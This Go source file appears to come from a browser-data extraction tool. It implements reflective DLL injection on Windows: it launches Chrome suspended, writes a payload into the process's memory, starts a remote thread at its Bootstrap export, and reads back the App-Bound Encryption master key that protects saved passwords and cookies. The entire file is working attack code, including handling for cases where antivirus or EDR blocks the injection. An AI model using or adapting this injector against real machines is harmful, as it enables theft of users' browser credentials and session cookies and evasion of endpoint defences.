//go:build windows

package injector

import (
	"encoding/binary"
	"fmt"
	"os"
	"runtime"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/moond4rk/hackbrowserdata/crypto/windows/abe_native/bootstrap"
	"github.com/moond4rk/hackbrowserdata/utils/winapi"
)

type Reflective struct {
	WaitTimeout time.Duration
}

const (
	exportName = "Bootstrap"
	// 30s covers GoogleChromeElevationService cold-start on first call after boot.
	defaultWait             = 30 * time.Second
	terminateWait           = 2 * time.Second
	bootstrapParamFieldSize = 8
)

func (r *Reflective) Inject(exePath string, payload []byte, env map[string]string) ([]byte, error) {
	if len(payload) == 0 {
		return nil, fmt.Errorf("injector: empty payload")
	}
	if exePath == "" {
		return nil, fmt.Errorf("injector: empty exePath")
	}
	if runtime.GOARCH != "amd64" {
		return nil, fmt.Errorf("injector: only amd64 is supported (got %s)", runtime.GOARCH)
	}

	loaderRVA, err := validateAndLocateLoader(payload)
	if err != nil {
		return nil, err
	}

	restore := setEnvTemporarily(env)
	defer restore()

	pi, err := spawnSuspended(exePath)
	if err != nil {
		return nil, err
	}
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	terminated := false
	defer func() {
		if !terminated {
			_ = windows.TerminateProcess(pi.Process, 1)
			_, _ = windows.WaitForSingleObject(pi.Process, uint32(terminateWait/time.Millisecond))
		}
	}()

	remoteBase, err := writeRemotePayload(pi.Process, payload)
	if err != nil {
		return nil, err
	}
	scratchBase, err := allocateScratch(pi.Process)
	if err != nil {
		return nil, err
	}
	paramsBase, err := writeBootstrapParams(pi.Process, scratchBase)
	if err != nil {
		return nil, err
	}

	if err := runAndWait(pi.Process, remoteBase, loaderRVA, paramsBase, r.wait()); err != nil {
		return nil, err
	}

	// Read output before TerminateProcess — after kill the memory is gone.
	result, readErr := readScratch(pi.Process, scratchBase)

	_ = windows.TerminateProcess(pi.Process, 0)
	_, _ = windows.WaitForSingleObject(pi.Process, uint32(terminateWait/time.Millisecond))
	terminated = true

	if readErr != nil {
		return nil, fmt.Errorf("injector: %w", readErr)
	}
	if result.Status != bootstrap.KeyStatusReady {
		return nil, fmt.Errorf("injector: payload did not publish key (%s)", formatABEError(result))
	}
	if len(result.Key) != bootstrap.KeyLen {
		return nil, fmt.Errorf("injector: payload signaled ready but key length is %d (want %d)",
			len(result.Key), bootstrap.KeyLen)
	}
	return result.Key, nil
}

// scratchResult is the structured view of the 12-byte diagnostic header (marker..com_err) plus the
// optional 32-byte master key the payload publishes back into the remote process's scratch region.
type scratchResult struct {
	Marker  byte
	Status  byte
	ErrCode byte
	HResult uint32
	ComErr  uint32
	Key     []byte
}

func (r *Reflective) wait() time.Duration {
	if r.WaitTimeout > 0 {
		return r.WaitTimeout
	}
	return defaultWait
}

func validateAndLocateLoader(payload []byte) (uint32, error) {
	arch, err := DetectPEArch(payload)
	if err != nil {
		return 0, fmt.Errorf("injector: detect payload arch: %w", err)
	}
	if arch != ArchAMD64 {
		return 0, fmt.Errorf("injector: only amd64 payload is supported (got %s)", arch)
	}
	off, err := FindExportFileOffset(payload, exportName)
	if err != nil {
		return 0, fmt.Errorf("injector: locate %s: %w", exportName, err)
	}
	return off, nil
}

// spawnSuspended launches exePath with its primary thread suspended. The browser's normal startup
// path is never resumed; only the remote Bootstrap thread runs, matching the ABE reference injector
// and avoiding any top-level Chromium UI.
func spawnSuspended(exePath string) (*windows.ProcessInformation, error) {
	exePtr, err := syscall.UTF16PtrFromString(exePath)
	if err != nil {
		return nil, fmt.Errorf("injector: exe path: %w", err)
	}
	si := &windows.StartupInfo{
		Cb: uint32(unsafe.Sizeof(windows.StartupInfo{})),
	}
	pi := &windows.ProcessInformation{}
	err = windows.CreateProcess(
		exePtr, nil, nil, nil,
		false,
		windows.CREATE_SUSPENDED,
		nil, nil, si, pi,
	)
	if err != nil {
		return nil, fmt.Errorf("injector: CreateProcess: %w", err)
	}
	return pi, nil
}

func writeRemotePayload(proc windows.Handle, payload []byte) (uintptr, error) {
	remoteBase, err := winapi.VirtualAllocEx(proc,
		uintptr(len(payload)),
		uint32(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uint32(windows.PAGE_READWRITE),
	)
	if err != nil {
		return 0, fmt.Errorf("injector: %w", err)
	}

	var written uintptr
	if err := windows.WriteProcessMemory(proc, remoteBase, &payload[0], uintptr(len(payload)), &written); err != nil {
		return 0, fmt.Errorf("injector: WriteProcessMemory: %w", err)
	}
	if int(written) != len(payload) {
		return 0, fmt.Errorf("injector: short write to target (%d/%d)", written, len(payload))
	}
	if _, err := winapi.VirtualProtectEx(proc, remoteBase, uintptr(len(payload)), uint32(windows.PAGE_EXECUTE_READ)); err != nil {
		return 0, fmt.Errorf("injector: protect payload: %w", err)
	}
	// Required before the region is executed. Bootstrap flushes again once it has mapped the
	// payload's own sections, but that runs too late to cover its own first instruction.
	if err := winapi.FlushInstructionCache(proc, remoteBase, uintptr(len(payload))); err != nil {
		return 0, fmt.Errorf("injector: flush instruction cache: %w", err)
	}
	return remoteBase, nil
}

func allocateScratch(proc windows.Handle) (uintptr, error) {
	// Keep the old scratch offsets stable for diagnostics/key reads, but place the scratch area in
	// its own RW allocation so the raw payload image can be execute-only after writing.
	const scratchSize = bootstrap.KeyOffset + bootstrap.KeyLen
	remoteBase, err := winapi.VirtualAllocEx(proc,
		uintptr(scratchSize),
		uint32(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uint32(windows.PAGE_READWRITE),
	)
	if err != nil {
		return 0, fmt.Errorf("injector: allocate scratch: %w", err)
	}
	return remoteBase, nil
}

// encodeBootstrapParams lays out the C BootstrapParams struct using the cgo-generated field
// offsets, so a field added or reordered in bootstrap_layout.h shows up as a layout.go diff
// rather than as a silently misread pointer inside the target process.
func encodeBootstrapParams(scratchBase uintptr) ([]byte, error) {
	fields := []struct {
		offset int
		addr   uintptr
	}{
		{bootstrap.ParamScratchBase, scratchBase},
		{bootstrap.ParamLoadLibraryA, winapi.AddrLoadLibraryA()},
		{bootstrap.ParamGetProcAddress, winapi.AddrGetProcAddress()},
		{bootstrap.ParamVirtualAlloc, winapi.AddrVirtualAlloc()},
		{bootstrap.ParamVirtualProtect, winapi.AddrVirtualProtect()},
		{bootstrap.ParamNtFlushIC, winapi.AddrNtFlushInstructionCache()},
	}
	params := make([]byte, bootstrap.ParamsSize)
	for _, f := range fields {
		if f.addr == 0 {
			return nil, fmt.Errorf("injector: failed to resolve one or more bootstrap params")
		}
		if err := putBootstrapParam(params, f.offset, f.addr); err != nil {
			return nil, err
		}
	}
	return params, nil
}

func putBootstrapParam(params []byte, offset int, addr uintptr) error {
	if offset < 0 || offset > len(params)-bootstrapParamFieldSize {
		return fmt.Errorf("injector: bootstrap param offset %d out of bounds for %d-byte block", offset, len(params))
	}
	binary.LittleEndian.PutUint64(params[offset:offset+bootstrapParamFieldSize], uint64(addr))
	return nil
}

func writeBootstrapParams(proc windows.Handle, scratchBase uintptr) (uintptr, error) {
	params, err := encodeBootstrapParams(scratchBase)
	if err != nil {
		return 0, err
	}

	remoteBase, err := winapi.VirtualAllocEx(proc,
		uintptr(len(params)),
		uint32(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uint32(windows.PAGE_READWRITE),
	)
	if err != nil {
		return 0, fmt.Errorf("injector: allocate bootstrap params: %w", err)
	}
	var written uintptr
	if err := windows.WriteProcessMemory(proc, remoteBase, &params[0], uintptr(len(params)), &written); err != nil {
		return 0, fmt.Errorf("injector: write bootstrap params: %w", err)
	}
	if int(written) != len(params) {
		return 0, fmt.Errorf("injector: short write to bootstrap params (%d/%d)", written, len(params))
	}
	return remoteBase, nil
}

// stillActive is the Windows STILL_ACTIVE exit code. GetExitCodeProcess returns this while the
// process is still running; any other value means the process has already terminated.
const stillActive uint32 = 259

func runAndWait(proc windows.Handle, remoteBase uintptr, loaderRVA uint32, param uintptr, wait time.Duration) error {
	entry := remoteBase + uintptr(loaderRVA)
	hThread, err := winapi.CreateRemoteThread(proc, entry, param)
	if err != nil {
		// Diagnostic: distinguish a dead target (Chrome self-exited before we could inject — policy,
		// version, UDD-restriction, sandbox-init failure) from a live target whose NtCreateThreadEx
		// was blocked by an EDR/AV hook. The remediation is very different in each case.
		var exitCode uint32
		if gecErr := windows.GetExitCodeProcess(proc, &exitCode); gecErr == nil {
			if exitCode == stillActive {
				return fmt.Errorf("injector: %w (target alive; likely EDR/AV blocking remote-thread injection)", err)
			}
			return fmt.Errorf("injector: %w (target exited with code 0x%x before injection)", err, exitCode)
		}
		return fmt.Errorf("injector: %w", err)
	}
	defer windows.CloseHandle(hThread)

	state, err := windows.WaitForSingleObject(hThread, uint32(wait/time.Millisecond))
	if err != nil {
		return fmt.Errorf("injector: WaitForSingleObject: %w", err)
	}
	switch state {
	case windows.WAIT_OBJECT_0:
		return nil
	case uint32(windows.WAIT_TIMEOUT):
		return fmt.Errorf("injector: remote Bootstrap thread timed out after %s", wait)
	default:
		return fmt.Errorf("injector: remote Bootstrap thread wait returned 0x%x", state)
	}
}

// readScratch pulls the payload's diagnostic header and (on success) the master key out of the target
// process's scratch region. A non-nil error means our own ReadProcessMemory call failed (distinct from
// the payload reporting a structured failure via result.Status/ErrCode/HResult).
func readScratch(proc windows.Handle, remoteBase uintptr) (scratchResult, error) {
	// hdr covers offsets 0x28..0x33: marker, status, extract_err_code, _reserved, hresult (LE u32),
	// com_err (LE u32).
	var hdr [12]byte
	var n uintptr
	if err := windows.ReadProcessMemory(proc,
		remoteBase+uintptr(bootstrap.MarkerOffset),
		&hdr[0], uintptr(len(hdr)), &n); err != nil {
		return scratchResult{}, fmt.Errorf("read scratch header: %w", err)
	}
	if int(n) != len(hdr) {
		return scratchResult{}, fmt.Errorf("read scratch header: short read %d/%d", n, len(hdr))
	}
	result := scratchResult{
		Marker:  hdr[0],
		Status:  hdr[1],
		ErrCode: hdr[2],
		HResult: binary.LittleEndian.Uint32(hdr[4:8]),
		ComErr:  binary.LittleEndian.Uint32(hdr[8:12]),
	}
	if result.Status != bootstrap.KeyStatusReady {
		return result, nil
	}

	buf := make([]byte, bootstrap.KeyLen)
	if err := windows.ReadProcessMemory(proc,
		remoteBase+uintptr(bootstrap.KeyOffset),
		&buf[0], uintptr(bootstrap.KeyLen), &n); err != nil {
		return result, fmt.Errorf("read master key from scratch: %w", err)
	}
	if int(n) != bootstrap.KeyLen {
		return result, fmt.Errorf("read master key from scratch: short read %d/%d", n, bootstrap.KeyLen)
	}
	result.Key = buf
	return result, nil
}

// setEnvTemporarily mutates the current process's env; NOT concurrency-safe. Callers must serialize
// Inject calls.
func setEnvTemporarily(env map[string]string) func() {
	if len(env) == 0 {
		return func() {}
	}

	type prev struct {
		key   string
		value string
		set   bool
	}
	saved := make([]prev, 0, len(env))
	for k, v := range env {
		old, existed := os.LookupEnv(k)
		saved = append(saved, prev{key: k, value: old, set: existed})
		_ = os.Setenv(k, v)
	}

	return func() {
		for _, p := range saved {
			if p.set {
				_ = os.Setenv(p.key, p.value)
			} else {
				_ = os.Unsetenv(p.key)
			}
		}
	}
}
